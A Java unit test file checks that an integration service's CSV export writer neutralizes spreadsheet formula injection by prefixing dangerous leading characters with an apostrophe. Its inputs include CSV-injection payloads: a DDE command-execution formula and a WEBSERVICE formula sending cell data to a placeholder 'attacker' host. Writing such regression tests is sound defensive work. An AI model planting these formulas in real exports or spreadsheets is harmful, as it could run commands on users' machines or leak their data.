package com.novaforge.integration.jobs;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

/**
 * The entity-export CSV writer's formula neutralization, pinned directly
 * (re-audit): this is the integration service's OWN copy of the reporting
 * exporter's {@code csvCell} — the reporting suite pins that twin, and nothing
 * drove this one (no test rendered an entity export). A regression here
 * reintroduces {@code =CMD}/{@code @WEBSERVICE} CSV injection in exported
 * record data. Same contract, same escaping, both copies.
 */
class EntityExportCsvCellTest {

    @Test
    @DisplayName("formula-led cells neutralize with a leading apostrophe — quote or not, never raw")
    void formulaLeadersNeutralize() {
        assertThat(JobRunner.csvCell("=cmd|'/c calc'!A1")).startsWith("'=");
        assertThat(JobRunner.csvCell("+SUM(A1:A9)")).startsWith("'+");
        assertThat(JobRunner.csvCell("-2+3|'cmd'")).startsWith("'-");
        assertThat(JobRunner.csvCell("@external([1]Book1!Sheet1!A1)")).startsWith("'@");
        assertThat(JobRunner.csvCell("\ttab-led")).startsWith("'\t");
        // a comma forces quoting AND the neutralizer still rides first
        assertThat(JobRunner.csvCell("=WEBSERVICE(\"http://attacker/?\"&A1)"))
                .startsWith("\"'=").doesNotStartWith("\"=");
    }

    @Test
    @DisplayName("plain data — interior operators, negatives mid-string, nulls — rides bare")
    void plainDataRidesBare() {
        assertThat(JobRunner.csvCell("acme corp")).isEqualTo("acme corp");
        assertThat(JobRunner.csvCell("revenue = top")).isEqualTo("revenue = top");
        assertThat(JobRunner.csvCell(null)).isEmpty();
        // RFC 4180: an interior comma quotes the cell, no neutralizer
        assertThat(JobRunner.csvCell("a,b")).isEqualTo("\"a,b\"");
        // an embedded quote doubles per RFC 4180
        assertThat(JobRunner.csvCell("say \"hi\"")).isEqualTo("\"say \"\"hi\"\"\"");
    }
}
